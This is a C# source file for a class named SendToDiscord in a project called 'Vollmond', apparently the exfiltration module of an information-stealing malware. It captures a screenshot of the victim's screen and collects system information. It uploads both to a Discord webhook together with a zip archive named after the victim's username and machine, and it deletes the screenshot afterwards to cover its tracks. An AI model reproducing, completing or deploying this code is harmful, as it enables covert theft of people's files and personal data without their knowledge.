namespace Vollmond
{
    internal class SendToDiscord
    {
        public static async Task SendAsync()
        {
            string screenshotPath = null;

            try
            {
                screenshotPath = Auxiliary.MakeScreenshot();

                using var httpClient = new HttpClient();
                using var multipart = new MultipartFormDataContent();

                // Add common content
                multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content");
                multipart.Add(new StringContent("Vollmond"), "username");
                multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");

                // Add screenshot - DON'T use 'using' here
                if (File.Exists(screenshotPath))
                {
                    var screenshotStream = File.OpenRead(screenshotPath);
                    var screenContent = new StreamContent(screenshotStream);
                    multipart.Add(screenContent, "file0", "screenshot.png");
                    // Stream will be disposed by HttpClient after sending
                }

                // Add zip file if exists - DON'T use 'using' here
                if (File.Exists(Program.zipPath))
                {
                    var zipStream = File.OpenRead(Program.zipPath);
                    var zipContent = new StreamContent(zipStream);
                    multipart.Add(zipContent, "file1", $"{Environment.UserName}@{Environment.MachineName}.zip");
                    // Stream will be disposed by HttpClient after sending
                }

                // Send the request
                var response = await httpClient.PostAsync(URLs.webhook, multipart);

                // Check response
                if (!response.IsSuccessStatusCode)
                {
                    var error = await response.Content.ReadAsStringAsync();
                    await httpClient.PostAsync(URLs.webhook, new StringContent($"ERROR\n{DateTime.Now}: HTTP {response.StatusCode} - {error}\n"));
                }
            }
            catch (Exception ex)
            {
                // Log error
                using (HttpClient client = new HttpClient()) {
                    await client.PostAsync(URLs.webhook, new StringContent($"ERROR-LOG\n {DateTime.Now}: {ex.Message}\n{ex.StackTrace}\n\n"));
                }
            }
            finally
            {
                // Clean up screenshot file
                if (screenshotPath != null && File.Exists(screenshotPath))
                {
                    try { File.Delete(screenshotPath); }
                    catch { /* Ignore cleanup errors */ }
                }
            }
        }
    }
}